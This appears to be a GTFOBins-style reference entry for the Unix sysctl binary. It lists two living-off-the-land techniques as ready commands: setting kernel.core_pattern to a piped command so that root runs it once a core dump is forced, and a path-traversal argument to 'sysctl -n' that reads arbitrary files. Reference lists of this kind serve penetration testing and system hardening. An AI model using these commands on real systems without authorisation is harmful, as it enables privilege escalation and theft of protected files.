---
type: gtfobin
name: sysctl
platform: Unix
functions: [command, file-read]
tags: [gtfobin, unix, lotl]
---

# sysctl

## command

```bash
sysctl 'kernel.core_pattern=|/path/to/command'
```
_The command is executed by `root` in the background when a core dump occurs.

To trigger a core dump, send the `SIGQUIT` signal to a process, for example:

```
sleep infinity &
kill -QUIT $!
```_
**Contexts:** sudo, suid

## file-read

```bash
sysctl -n "/../../path/to/input-file"
```
**Contexts:** sudo, suid, unprivileged
